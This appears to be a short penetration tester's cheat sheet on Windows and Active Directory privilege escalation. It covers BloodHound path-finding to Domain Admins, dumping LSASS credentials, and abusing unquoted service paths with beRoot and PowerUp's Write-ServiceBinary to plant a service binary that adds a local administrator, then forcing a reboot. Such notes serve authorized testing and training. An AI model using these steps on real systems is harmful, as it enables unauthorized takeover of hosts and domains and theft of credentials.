# Privilege Escalation

### Bloodhound
BloodHound is a tool for reviewing privilege escalation paths within Active Directory and Entra ID environments. The graphs shown are generated using data collected by SharpHound and AzureHound. 
```bash
cd Bloodhound-win32-x64/
BloodHound.exe
# login (neo4j:BloodHound) 
# use one of the options below to discover a path to privesc
```
Option 1: use a pre-built query. 
```bash
# enter the name of an entity in the search bar (top-left) 
# right-click entity and select "Mark User as Owned"
# click "Queries" > "Shortest Paths to Domain Admins from Owned Principals"
# pick a Domain Admins group
# review path to privesc
# privesc will require connecting to machines and dumping creds from LSASS
```
Option 2: specify a target node. 
```bash
# enter the name of an entity in the search bar (top-left) 
# click the "Pathfinding" icon
# enter the name of a Domain Admins group and click "Find Path"
# click "Change Layout" (right-side)
# review path to privesc 
```

## Unquoted Service Paths
### beRoot
```bash
beRoot.exe # identify privesc options
# look for "[!] Path containing spaces without quotes"
```

### PowerUp
The default exploit used by PowerUp's "Write-ServiceBinary" function creates a local administrator. Use the `-Command` to specify a different exploit. If the unquoted path of your target service is `C:\Program Files\Vuln Server\VulnServer.exe`, the string you would use with `Write-ServiceBinary` is `C:\Program Files\Vuln.exe`. 
```bash
# target Terminal 1:
Import-Module .\PowerUp.ps1
Invoke-AllChecks
# look for "[*] Checking for unquoted service paths"
# pick vulnerable service and copy/paste the string in its "AbuseFunction" field
Write-ServiceBinary -Name "Vuln Server" -Path "C:\Program Files\Vuln.exe"
# check your exploit settings and then get the target to restart (e.g., shutdown /r /t 0)
# login to the target using "john" and "Password123!"
```
